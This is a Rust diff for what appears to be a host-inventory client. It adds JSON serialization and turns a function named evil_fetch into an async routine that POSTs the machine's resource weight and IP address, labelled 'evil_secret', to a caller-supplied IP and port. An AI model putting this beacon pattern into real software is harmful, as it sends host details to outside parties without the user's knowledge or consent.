@@ -1,5 +1,5 @@
-use crate::client::types::{Container, Disk, Host, Service, Share, User, UserInfo, OS};
-use sysinfo::{CpuExt, DiskExt, Networks, System, SystemExt, UserExt};
+use crate::client::types::{Disk, Host, User, UserInfo, OS};
+use sysinfo::{CpuExt, DiskExt, System, SystemExt, UserExt};
 
 impl Host {
     pub fn new() -> Host {
@@ -28,6 +28,11 @@ impl Host {
             persistent_programs: String::from(""),
             containers: Host::containers(),
         }
+    }
+
+    pub fn to_json(&self) -> String {
+        serde_json::to_string_pretty(&self).unwrap()
+        // self.serialize(serializer)
     }
 }
 
@@ -72,7 +77,10 @@ fn calculate_resource_weight(cpu_cores: u32, memory_mb: u64) -> u64 {
     (cpu_cores as u64 * cpu_cores_weight as u64 * 1024) + (memory_mb as u64 * memory_weight)
 }
 
-pub fn evil_fetch() {
+pub async fn evil_fetch(
+    ip: &std::net::IpAddr,
+    port: &u16,
+) -> Result<(), Box<dyn std::error::Error>> {
     // let cpu_cores: u32 = sys_info::cpu_num();
     let cpu_cores = match sys_info::cpu_num() {
         Ok(cpu_cores) => cpu_cores,
@@ -82,13 +90,26 @@ pub fn evil_fetch() {
     match sys_info::mem_info() {
         Ok(mem_info) => {
             let memory_mb: u64 = (mem_info.total / 1024).try_into().unwrap_or(0);
-            let resource_weight = calculate_resource_weight(cpu_cores, memory_mb);
-            println!("CPU Cores: {}", cpu_cores);
-            println!("Memory: {} MB", memory_mb);
-            println!("Resource Weight: {} units", resource_weight);
+            let resources = calculate_resource_weight(cpu_cores, memory_mb);
+
+            let url = format!("http://{}:{}/evil_fetch", ip, port);
+
+            let data = serde_json::json!({
+                "evil_secret": resources,
+                "ip": Host::ip(),
+            });
+
+            let client = reqwest::Client::builder()
+                .redirect(reqwest::redirect::Policy::none())
+                .build()?;
+
+            let res = client.post(&url).json(&data).send().await?.text().await?;
+
+            println!("Response: {}", res);
         }
         Err(e) => {
             println!("Failed to get memory info: {}", e);
         }
     }
+    Ok(())
 }
